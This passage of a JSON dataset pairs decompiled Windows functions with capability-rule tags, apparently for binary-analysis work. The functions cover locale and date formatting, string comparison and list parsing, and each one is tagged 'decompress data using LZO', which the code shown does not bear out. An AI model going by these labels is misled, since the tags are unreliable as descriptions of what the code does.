        "decompiled_code": "\nvoid __cdecl fcn.00409c94(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t arg_10h;\n    uint var_100ch;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EDX;\n    if (in_EDX != 0) {\n        iVar1 = *(in_EDX + -4);\n    }\n    if (iVar1 < 0xc00) {\n        iVar1 = in_EDX;\n        if (in_EDX != 0) {\n            iVar1 = *(in_EDX + -4);\n        }\n        var_ch = fcn.00409888(arg_8h, in_ECX, iVar1);\n        iVar1 = 0x1000;\n    }\n    else {\n        iVar1 = in_EDX;\n        var_ch = in_EDX;\n        if (in_EDX != 0) {\n            iVar1 = *(in_EDX + -4);\n            var_ch = iVar1;\n        }\n    }\n    if (var_ch < iVar1 + -1) {\n        fcn.00404e90();\n    }\n    else {\n        while (iVar1 + -1 <= var_ch) {\n            iVar1 = iVar1 * 2;\n            fcn.00404da0();\n            fcn.004054ec();\n            arg_10h = in_EDX;\n            if (in_EDX != 0) {\n                arg_10h = *(in_EDX + -4);\n            }\n            var_ch = fcn.00409888(arg_8h, in_ECX, arg_10h);\n        }\n        fcn.004054ec();\n    }\n    return;\n}\n",
        "token_count": 386
    },
    "0040a8bc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a8bc(uint arg_8h)\n\n{\n    fcn.0040a878(arg_8h);\n    return;\n}\n",
        "token_count": 36
    },
    "0040a9c8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a9c8(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY336;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack300 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack304 = 0x40ab2a;\n    uStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffecc;\n    fcn.00404da0();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    fcn.00404e38();\n    uVar1 = fcn.00405264(&fcn.0040a9c8::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.0040a9c8::var_14h, uVar1);\n    uStackY336 = 0x40aa4b;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        uStackY336 = 0x40aa65;\n        fcn.00405010();\n        if (in_EAX == 1) {\n            if (*0x4958c8 == 4) {\n                if (*0x4958cc == 1) {\n                    uStackY336 = 0x40aac5;\n                    iVar2 = fcn.0040cf90();\n                    if (iVar2 == 4) {\n                        fcn.0040d0ac();\n                        fcn.00404f98();\n                        fcn.0040d130();\n                        uStackY336 = 0x40ab09;\n                        fcn.00404e90();\n                    }\n                }\n            }\n            else if (*0x4958c8 == 0x11) {\n                fcn.0040d130();\n                fcn.004052c4();\n                uStackY336 = in_EDX;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStackY336;\n    fcn.00404da0(0x40ab31);\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 618
    },
    "0040ab44": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040ab44(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char **in_EDX;\n    uint *in_FS_OFFSET;\n    char **ppcStackY332;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_118h;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack296 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack300 = 0x40ac32;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    fcn.00404da0();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    if (in_EAX < 3) {\n        fcn.00404e38();\n    }\n    else {\n        fcn.00404e38();\n    }\n    uVar1 = fcn.00405264(&fcn.0040ab44::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.0040ab44::var_14h, uVar1);\n    ppcStackY332 = 0x40abd5;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        ppcStackY332 = 0x40abeb;\n        fcn.00405010();\n        if ((in_EAX == 1) && (**in_EDX == '0')) {\n            fcn.004052c4();\n            ppcStackY332 = in_EDX;\n        }\n    }\n    *in_FS_OFFSET = ppcStackY332;\n    fcn.00404da0(0x40ac39);\n    return;\n}\n",
        "token_count": 491
    },
    "0040b528": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b528(int32_t param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb4;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t var_14h;\n    int32_t var_10h;\n    uchar var_9h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_14h = 0;\n    uStack44 = 0x40b5ee;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    var_9h = 0;\n    puVar1 = &stack0xfffffffc;\n    var_8h = param_2;\n    if (param_1 != 0) {\n        fcn.0040b470();\n        fcn.004052c4(&var_14h);\n        var_10h = var_14h;\n        iVar3 = param_1;\n        if (param_1 != 0) {\n            iVar3 = *(param_1 + -4);\n        }\n        iVar4 = var_14h;\n        if (var_14h != 0) {\n            iVar4 = *(var_14h + -4);\n        }\n        uVar2 = fcn.00405264(iVar4);\n        uVar2 = fcn.00405264(iVar3, uVar2);\n        in_stack_ffffffb4 = 0x400;\n        iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n        puVar1 = puStack40;\n        if (iVar3 == 2) {\n            if (param_1 != 0) {\n                param_1 = *(param_1 + -4);\n            }\n            *var_8h = *var_8h + param_1;\n            var_9h = 1;\n        }\n    }\n    puStack40 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffb4;\n    fcn.00404da0(0x40b5f5);\n    return;\n}\n",
        "token_count": 521
    },
    "0040b600": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040b600(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char cStack16;\n    \n    uVar2 = 0;\n    fcn.0040b470();\n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    if ((*param_2 <= iVar1) && (cStack16 = param_1,  *(in_EAX + -1 + *param_2) == cStack16)) {\n        *param_2 = *param_2 + 1;\n        uVar2 = 1;\n    }\n    return CONCAT44(param_1, uVar2);\n}\n",
        "token_count": 180
    },
    "0040bcc4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0040bcc4(void)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    \n    cVar1 = fcn.0040bacc();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX - 4);\n        }\n        uVar2 = in_EAX & 0xffffff00 | in_EAX < 1;\n    }\n    return CONCAT44(1, uVar2);\n}\n",
        "token_count": 133
    },
    "0040bcfc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040bcfc(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    double dStack28;\n    \n    uVar3 = 1;\n    cVar1 = fcn.0040b780();\n    if (cVar1 == '\\0') {\n        uVar2 = 1;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX + -4);\n        }\n        if (in_EAX < 1) {\n            uVar2 = 1;\n        }\n        else {\n            uVar2 = fcn.0040bacc();\n        }\n        uVar2 = uVar2 ^ 1;\n    }\n    if (uVar2 == 0) {\n        if (dStack28 < *0x40bd94) {\n            *param_2 = dStack28 - 0.0;\n        }\n        else {\n            *param_2 = dStack28 + 0.0;\n        }\n    }\n    else {\n        uVar3 = fcn.0040bcc4();\n    }\n    return uVar3;\n}\n",
        "token_count": 272
    },
    "0040c120": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040c120(void)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    uStack44 = 0x40c2f0;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar5 = 1;\n    fcn.00404da0();\n    arg_8h = &fcn.0040c120::var_8h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040bde4(arg_8h);\n    iVar3 = fcn.00408f00();\n    if (iVar3 - 3U < 3) {\n        while (iVar3 = fcn.00405060(),  iVar5 <= iVar3) {\n            uVar4 = *(in_EAX + -1 + iVar5);\n            if ((*((uVar4 >> 3) + 0x49081c) >> (uVar4 & 7) & 1) == 0) {\n                iVar3 = fcn.004096e4();\n                if (iVar3 == 0) {\n                    fcn.0040506c();\n                    iVar5 = iVar5 + 1;\n                }\n                else {\n                    iVar3 = fcn.004096e4();\n                    if (iVar3 == 0) {\n                        fcn.0040506c();\n                        iVar5 = iVar5 + 3;\n                    }\n                    else {\n                        iVar3 = fcn.004096e4();\n                        if (iVar3 == 0) {\n                            fcn.0040506c();\n                            iVar5 = iVar5 + 1;\n                        }\n                        else {\n                            cVar1 = *(in_EAX + -1 + iVar5);\n                            if ((cVar1 == 'Y') || (cVar1 == 'y')) {\n                                fcn.0040506c();\n                            }\n                            else {\n                                fcn.00404f88();\n                                fcn.0040506c();\n                            }\n                        }\n                    }\n                }\n                iVar5 = iVar5 + 1;\n            }\n            else {\n                var_4h = fcn.0040d1c8();\n                arg_8h = &fcn.0040c120::var_10h;\n                fcn.004052c4();\n                fcn.0040506c();\n                iVar5 = iVar5 + var_4h;\n            }\n        }\n    }\n    else {\n        if ((*0x4958c8 == 4) || (*0x4958c8 - 0x11U < 2)) {\n            bVar2 = true;\n        }\n        else {\n            bVar2 = false;\n        }\n        if (bVar2) {\n            for (; iVar3 = fcn.00405060(),  iVar5 <= iVar3; iVar5 = iVar5 + 1) {\n                cVar1 = *(in_EAX + -1 + iVar5);\n                if ((cVar1 != 'G') && (cVar1 != 'g')) {\n                    fcn.00404f88();\n                    fcn.0040506c();\n                }\n            }\n        }\n        else {\n            fcn.00404df4();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack44 = 0x40c2f7;\n    iStack48 = 0x40c2ef;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 891
    },
    "0040cf90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040cf90(void)\n\n{\n    fcn.0040cfb4();\n    return;\n}\n",
        "token_count": 26
    },
    "0040cfb4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040cfb4(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (param_2 < 1) {\n        bVar1 = true;\n    }\n    else {\n        iVar4 = in_EAX;\n        if (in_EAX != 0) {\n            iVar4 = *(in_EAX + -4);\n        }\n        bVar1 = iVar4 < param_2;\n    }\n    iVar4 = 0;\n    if ((!bVar1) && (iVar4 = param_2,  *0x4958d0 != '\\0')) {\n        iVar3 = 1;\n        iVar4 = 0;\n        if (0 < param_2) {\n            do {\n                uVar2 = *(in_EAX + -1 + iVar3);\n                if ((*((uVar2 >> 3) + 0x49081c) >> (uVar2 & 7) & 1) == 0) {\n                    iVar3 = iVar3 + 1;\n                }\n                else {\n                    iVar3 = fcn.0040d200();\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar3 <= param_2);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 310
    },
    "0040d01c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d01c(int32_t *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    iVar4 = 1;\n    iVar3 = 1;\n    while ((iVar3 < iVar1 && (iVar4 < in_EDX))) {\n        iVar4 = iVar4 + 1;\n        uVar2 = *(in_EAX + -1 + iVar3);\n        if ((*((uVar2 >> 3) + 0x49081c) >> (uVar2 & 7) & 1) == 0) {\n            iVar3 = iVar3 + 1;\n        }\n        else {\n            iVar3 = fcn.0040d200();\n        }\n    }\n    if (((iVar4 == in_EDX) && (iVar3 < iVar1)) &&\n       (uVar2 = *(in_EAX + -1 + iVar3),  (*((uVar2 >> 3) + 0x49081c) >> (uVar2 & 7) & 1) != 0)) {\n        iVar3 = fcn.0040d200();\n        iVar3 = iVar3 + -1;\n    }\n    *in_ECX = iVar4;\n    *arg_8h = iVar3;\n    return;\n}\n",
        "token_count": 373
    },
    "0040d0ac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040d0ac(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *in_stack_ffffffe8;\n    int32_t *piVar3;\n    int32_t aiStack20 [2];\n    \n    piVar3 = aiStack20;\n    aiStack20[0] = 0;\n    if (param_2 < 1) {\n        bVar1 = true;\n    }\n    else {\n        iVar2 = in_EAX;\n        if (in_EAX != 0) {\n            iVar2 = *(in_EAX + -4);\n        }\n        bVar1 = iVar2 < param_2;\n    }\n    iVar2 = aiStack20[0];\n    if (((!bVar1) && (iVar2 = param_2,  1 < param_2)) && (iVar2 = param_2,  *0x4958d0 != '\\0')) {\n        fcn.0040d01c(aiStack20);\n        if (aiStack20[0] < param_2 + -1) {\n            bVar1 = true;\n        }\n        else {\n            if (in_EAX != 0) {\n                in_EAX = *(in_EAX + -4);\n            }\n            bVar1 = in_EAX <= piVar3;\n        }\n        iVar2 = aiStack20[0];\n        if (bVar1) {\n            in_stack_ffffffe8 = NULL;\n        }\n        else {\n            in_stack_ffffffe8 = piVar3 + 1;\n        }\n    }\n    aiStack20[0] = iVar2;\n    return CONCAT44(aiStack20[0], in_stack_ffffffe8);\n}\n",
        "token_count": 388
    },
    "0040d130": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040d130(uint param_1, uchar *param_2)\n\n{\n    uchar *in_EAX;\n    uchar *puVar1;\n    uchar *puVar2;\n    uchar *in_stack_ffffffec;\n    uchar **ppuVar3;\n    uchar *apuStack16 [2];\n    \n    ppuVar3 = apuStack16;\n    apuStack16[0] = NULL;\n    puVar1 = apuStack16[0];\n    if (0 < param_2) {\n        puVar1 = in_EAX;\n        if (in_EAX != NULL) {\n            puVar1 = *(in_EAX + -4);\n        }\n        if ((puVar1 < param_2) && (param_2 = in_EAX,  in_EAX != NULL)) {\n            param_2 = *(in_EAX + -4);\n        }\n        puVar1 = param_2;\n        if (*0x4958d0 != '\\0') {\n            fcn.0040d01c(apuStack16);\n            puVar2 = in_EAX;\n            if (in_EAX != NULL) {\n                puVar2 = *(in_EAX + -4);\n            }\n            in_stack_ffffffec = ppuVar3;\n            puVar1 = apuStack16[0];\n            if ((puVar2 < ppuVar3) && (in_stack_ffffffec = in_EAX,  in_EAX != NULL)) {\n                in_stack_ffffffec = *(in_EAX + -4);\n            }\n        }\n    }\n    apuStack16[0] = puVar1;\n    return CONCAT44(apuStack16[0], in_stack_ffffffec);\n}\n",
        "token_count": 373
    },
    "0040d238": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040d238(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    if (param_2 < 1) {\n        bVar3 = false;\n    }\n    else {\n        iVar1 = in_EAX;\n        if (in_EAX != 0) {\n            iVar1 = *(in_EAX + -4);\n        }\n        bVar3 = param_2 <= iVar1;\n    }\n    if (bVar3) {\n        bVar3 = *(in_EAX + -1 + param_2) == '\\\\';\n    }\n    else {\n        bVar3 = false;\n    }\n    if (bVar3) {\n        uVar2 = fcn.0040cf54();\n        return uVar2 & 0xffffff00 | uVar2 == '\\0';\n    }\n    return 0;\n}\n",
        "token_count": 215
    },
    "0040d280": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0040d280(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    bool bVar3;\n    bool bVar4;\n    \n    bVar4 = false;\n    if (param_1 < 1) {\n        bVar3 = true;\n    }\n    else {\n        if (param_2 != 0) {\n            param_2 = *(param_2 + -4);\n        }\n        bVar3 = param_2 < param_1;\n    }\n    if (bVar3) {\n        bVar3 = true;\n    }\n    else {\n        cVar1 = fcn.0040cf54();\n        bVar3 = cVar1 != '\\0';\n    }\n    if (!bVar3) {\n        fcn.00405264();\n        iVar2 = fcn.00409728();\n        bVar4 = iVar2 != 0;\n    }\n    return bVar4;\n}\n",
        "token_count": 217
    },
    "0040d314": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040d314(uint param_1, int32_t *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    if (*0x4958d0 == '\\0') {\n        uVar4 = fcn.00408b80();\n    }\n    else {\n        iVar3 = in_EAX;\n        if (in_EAX != 0) {\n            iVar3 = *(in_EAX + -4);\n        }\n        uVar4 = fcn.004054ec();\n        iVar6 = 1;\n        if (0 < iVar3) {\n            do {\n                iVar5 = fcn.004052bc();\n                *(iVar5 + -1 + iVar6) = *(in_EAX + -1 + iVar6);\n                uVar4 = *(in_EAX + -1 + iVar6);\n                if ((*((uVar4 >> 3) + 0x49081c) >> (uVar4 & 7) & 1) == 0) {\n                    cVar2 = *(*param_2 + -1 + iVar6);\n                    uVar4 = cVar2 + 0xa5;\n                    if (cVar2 + 0xbfU < 0x1a) {\n                        uVar4 = fcn.004052bc();\n                        pcVar1 = (uVar4 - 1) + iVar6;\n                        *pcVar1 = *pcVar1 + ' ';\n                    }\n                }\n                else {\n                    iVar6 = iVar6 + 1;\n                    uVar4 = fcn.004052bc();\n                    *((uVar4 - 1) + iVar6) = *(in_EAX + -1 + iVar6);\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 <= iVar3);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 439
    },
    "00411bbc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00411bbc(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *puStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack28 = 0x411c4b;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.0041196c();\n    cVar1 = *in_EAX;\n    if (cVar1 == '\\x01') {\n        puStack36 = 0x411bf8;\n        fcn.00408ec4();\n    }\n    else if ((cVar1 == '\\x02') || (cVar1 == '\\t')) {\n        puStack36 = &fcn.00411bbc::var_4h;\n        fcn.004052c4();\n        fcn.00408ec4();\n    }\n    else {\n        puStack36 = 0x411c33;\n        fcn.004119c4();\n    }\n    *in_FS_OFFSET = puStack36;\n    uStack28 = 0x411c52;\n    iStack32 = 0x411c4a;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 312
    },
    "00416480": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00416543)\n// WARNING: Removing unreachable block (ram,0x004164ed)\n// WARNING: Removing unreachable block (ram,0x004164f9)\n// WARNING: Removing unreachable block (ram,0x00416565)\n// WARNING: Removing unreachable block (ram,0x0041654e)\n// WARNING: Removing unreachable block (ram,0x00416570)\n\nvoid fcn.00416480(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x4165a9;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    iVar1 = (**(*in_EAX + 0x14))();\n    fcn.00416d7c();\n    iVar2 = iVar1;\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00404e90();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x4165b0;\n    uStack60 = 0x41659b;\n    fcn.00404da0();\n    uStack60 = 0x4165a8;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 478
    },
    "00416a68": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00416a92)\n\nvoid fcn.00416a68(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x416ab9;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    (**(*in_EAX + 0x1c))();\n    fcn.00417794();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x416ac0;\n    uStack24 = 0x416ab8;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 186
    },
    "00416b50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00416c36)\n\nvoid __fastcall fcn.00416b50(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char *pcVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    code *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x416cd9;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack64 = 0x416b82;\n    fcn.00416128();\n    uStack68 = 0x416ca7;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    (**(*in_EAX + 0x44))();\n    if (param_2 != NULL) {\n        fcn.00416d7c();\n        iVar2 = fcn.004089fc();\n        if (iVar2 == 0) {\n            while (*param_2 != '\\0') {\n                for (; ((cVar1 = *param_2,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r')); param_2 = param_2 + 1\n                    ) {\n                }\n                fcn.00404e90();\n                (**(*in_EAX + 0x38))();\n                if (*param_2 == '\\r') {\n                    param_2 = param_2 + 1;\n                }\n                if (*param_2 == '\\n') {\n                    param_2 = param_2 + 1;\n                }\n            }\n        }\n        else {\n            if (*(*0x492d08 + 0xc) == '\\0') {\n                var_10h = fcn.0040973c;\n            }\n            else {\n                var_10h = fcn.0040d3a8;\n            }\n            fcn.00416d7c();\n            while (*param_2 != '\\0') {\n                fcn.00416d7c();\n                fcn.00405264();\n                pcVar3 = (*var_10h)();\n                for (; (*param_2 != '\\0' && (pcVar3 != param_2)); param_2 = param_2 + 1) {\n                }\n                fcn.00404e90();\n                (**(*in_EAX + 0x38))();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x416cae;\n    uStack68 = 0x416ca6;\n    fcn.004161e4();\n    return;\n}\n",
        "token_count": 695
    },
    "00418cec": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00418d13)\n// WARNING: Removing unreachable block (ram,0x00418d1b)\n\nvoid fcn.00418cec(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x418d3c;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    fcn.0041a5c4();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x418d43;\n    uStack20 = 0x418d3b;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 184
    },
    "00419a54": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00419aa9)\n\nvoid __fastcall fcn.00419a54(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack76;\n    uint uStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack56 = &stack0xfffffffc;\n    uStack48 = 0x419c48;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x419bfa;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = 0x419a8f;\n    fcn.0041a588();\n    uStack72 = 0x419bd3;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar3 = 1;\n    *(in_EAX + 0x88) = 1;\n    var_14h = param_2;\n    puStack68 = &stack0xfffffffc;\n    while( true ) {\n        for (; (iVar3 < 1 && (*(iVar3 + -1) != '.')); iVar3 = iVar3 + 1) {\n        }\n        iStack76 = in_EAX + 0x80;\n        fcn.004052c4();\n        if (0 < iVar3) break;\n        fcn.00404198();\n        puVar2 = fcn.00411a28();\n        if (puVar2 == NULL) {\n            fcn.00418c3c();\n        }\n        var_18h = NULL;\n        if (***puVar2 == '\\a') {\n            var_18h = fcn.00411aec();\n        }\n        cVar1 = fcn.004040e4();\n        if (cVar1 == '\\0') {\n            fcn.00419a38(&stack0xfffffffc);\n        }\n        var_14h = var_18h;\n        iVar3 = iVar3 + 1;\n    }\n    fcn.00404198();\n    iVar3 = fcn.00411a28();\n    if (iVar3 == 0) {\n        *(in_EAX + 0x88) = 0;\n        (**(*var_14h + 4))();\n        *(in_EAX + 0x88) = 1;\n        if (*(in_EAX + 0x80) != 0) {\n            fcn.00418c3c();\n        }\n    }\n    else 